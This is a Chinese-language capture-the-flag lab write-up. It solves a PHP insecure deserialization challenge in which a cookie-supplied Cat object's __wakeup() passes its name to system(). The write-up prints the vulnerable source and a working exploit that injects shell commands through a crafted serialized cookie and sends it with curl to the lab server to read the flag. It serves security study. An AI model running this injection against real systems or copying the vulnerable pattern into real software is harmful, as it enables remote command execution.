# LAB - Serializable Cat
###### tags: `資安` `Web`

## 題目解析
畫面中可以看到第一次連進網站顯示 cat_ random number，第二次就是一個 cowsay 的畫面，點底下那行字可以看到網頁 source code。

![](https://i.imgur.com/Z0TF7yJ.png)
--
![](https://i.imgur.com/2cPrMGl.png)

```php=
<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

if (!isset($_COOKIE['cat_session'])) {
    $cat = new Cat("cat_" . rand(0, 0xffff));
    setcookie('cat_session', base64_encode(serialize($cat)));
} else {
    $cat = unserialize(base64_decode($_COOKIE['cat_session']));
}
?>
<p>Hello, <?= $cat->name ?>.</p>
<a href="/?source">source code</a>
```
## 解題流程
從 source code 可以看到一個名為 Cat 的 class，有定義好反序列化自動執行的 magic function \_\_wakeup()，另外讀取頁面時會判斷有無 cat_session 這個 cookie，若有就做反序列化，沒有就建立一個 random name。

這邊就可以利用 php 反序列化會自動執行 \_\_wakeup() 的特性，\_\_wakeup() 做了一個 system("cowsay 'Welcome back, $this->name'")，因此我們其實可以自行建立一個 Cat，對 \_\_construct 做一點操作去改變名字，序列化後傳給 server，讓 server 反序列化後自動去執行到別的指令。

名字的地方先用一個 \' 來閉合前面的 cowsay 指令的參數，輸入其餘指令，再用 \' 閉合後面空字串，最後在 base64 encode 序列化當成 cookie 傳給 server 就能，就能達到惡意指令輸入，稍微找一下就可以看到 FLAG 了。

```php=
<?php
class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}
$cat = new Cat("'.; cd /; cat flag_5fb2acebf1d0c558'");
$my_cookie = base64_encode(serialize($cat));
system("curl http://h4ck3r.quest:8601/ --cookie 'cat_session=$my_cookie'")
?>
```
## FLAG 截圖
![](https://i.imgur.com/yYxpI2d.png)